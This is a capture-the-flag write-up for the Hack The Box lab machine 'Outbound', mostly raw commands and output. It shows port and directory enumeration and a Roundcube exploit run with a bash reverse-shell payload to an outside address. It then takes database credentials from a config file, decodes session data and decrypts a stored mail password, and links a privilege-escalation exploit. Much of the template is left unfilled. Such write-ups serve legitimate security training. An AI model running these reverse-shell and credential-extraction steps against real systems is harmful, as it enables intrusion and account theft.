### Hack The Box Writeup: Outbound

## Overview

- **Machine Name**: Outbound
- **Difficulty**: Easy
- **Platform**: Hack The Box
- **Operating System**: Linux
- **Key Objectives**: Gain root/admin access, exploit a specific vulnerability
- **Date Solved**: August 30, 2025

## Tools Used

- **Enumeration**: \[e.g., Nmap, Gobuster\]
- **Exploitation**: \[e.g., Metasploit, Custom Python scripts\]
- **Privilege Escalation**: \[e.g., LinPEAS, Windows Exploit Suggester\]
- **Other**: \[e.g., Burp Suite, Wireshark\]

## Methodology

### Initial Enumeration

```bash
pinc -c 1 10.10.11.77
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.77 -oG allPorts
nmap -sCV -p22,80 10.10.11.77 -oN targeted

gobuster dir -u http://nocturnal.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 60

# view roundcube version
```
![alt text](image.png)

```bash
# CVE-2025-49113
# https://github.com/hakaioffsec/CVE-2025-49113-exploit
# usage : php CVE-2025-49113.php <url> <username> <password> <command>

nc -nlvp 443

php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'"

cd /home
su tyler # LhKL1o9Nm3X2



```
### Exploitation

```bash
# always view the route of web page
/var/www/html/roundcube/config$ cat config.inc.php

# ans 
# $config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
# $config['des_key'] = 'rcmail-!24ByteDESkey*Str';

# Enter into mysql
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E

*************************** 1. row ***************************
             user_id: 1
            username: jacob
           mail_host: localhost
             created: 2025-06-07 13:55:18
          last_login: 2025-06-11 07:52:49
        failed_login: 2025-06-11 07:51:32
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
*************************** 2. row ***************************
             user_id: 2
            username: mel
           mail_host: localhost
             created: 2025-06-08 12:04:51
          last_login: 2025-06-08 13:29:05
        failed_login: NULL
failed_login_counter: NULL
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
*************************** 3. row ***************************
             user_id: 3
            username: tyler
           mail_host: localhost
             created: 2025-06-08 13:28:55
          last_login: 2025-08-31 06:29:22
        failed_login: 2025-06-11 07:51:22
failed_login_counter: 1
            language: en_US
         preferences: a:2:{s:11:"client_hash";s:16:"d8xDp2cAgMWj8w4z";i:0;b:0;}

# finding hash

mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E

# ans
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7
*************************** 2. row ***************************
sess_id: hfhcfeg1059hfthnjosuf1e87m
changed: 2025-08-31 06:41:20
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiI0b2VwMkRsYWVBSXRycjU5ZXJLd1JiYTk0TGVkZXBhQSI7
*************************** 3. row ***************************
sess_id: uqjldpoh8c1c52kjprcjlq0mjn
changed: 2025-08-31 06:41:07
     ip: 172.17.0.1
   vars: dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3NzIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJBYmh2T2JXYllNZTV5Wm5xc08yOHBVd0xmVVBkcjRBOSI7

# base64 -d
echo -e "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7" | base64 -d | grep "pass"

# ans
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";

# pass
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"

# auth 
auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW"

# from config.inc.php
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

# This is 24 characters long, which is exactly the size needed for Triple DES (3DES) in EDE3 (3-key) -explain

# lest use decript python
python3 decryp.py

# ans
Decrypted password: 595mO8DmwGeD

su jacob
595mO8DmwGeD

# search mails
# ans
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

ssh jacob@10.10.11.77 
gY4Wr3a1evp4

cat user.txt





```

### Privilege Escalation

\[Explain how you escalated privileges to root/admin. Include any misconfigurations or exploits used.\]

```bash
sudo /usr/bin/below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help# Example: Checking for SUID binaries

# below vunerability
# https://github.com/dollarboysushil/Linux-Privilege-Escalation-CVE-2025-27591


```

\[Describe the final access achieved, e.g., root shell, admin credentials.\]

## Challenges Faced

\[List specific challenges encountered, e.g., difficulty identifying the correct exploit, dealing with restricted shells.\]

- **Challenge 1**: \[e.g., Nmap scans were blocked by a firewall.\]
  - **Solution**: \[e.g., Used --script-args to bypass restrictions.\]
- **Challenge 2**: \[e.g., Password cracking took too long.\]
  - **Solution**: \[e.g., Optimized wordlist with custom rules in Hashcat.\]

## Lessons Learned

\[Summarize key takeaways from solving the machine.\]

- Learned to identify \[specific vulnerability, e.g., outdated Samba versions\] through thorough enumeration.
- Improved skills in \[technique, e.g., manual exploit development for CVE-XXXX-XXXX\].
- Gained experience with \[tool, e.g., LinPEAS for privilege escalation\].

## References

- \[Link to HTB machine page, e.g., https://app.hackthebox.com/machines/Lame\]
- \[CVE details, e.g., https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXX\]
- \[Tool documentation, e.g., https://nmap.org/book/man.html\]
- \[Relevant blog post or tutorial, e.g., https://example.com/samba-exploit-guide\]

---

*Written by edibauer, Aug 31, 2025. Feedback welcome at github.com/edibauer*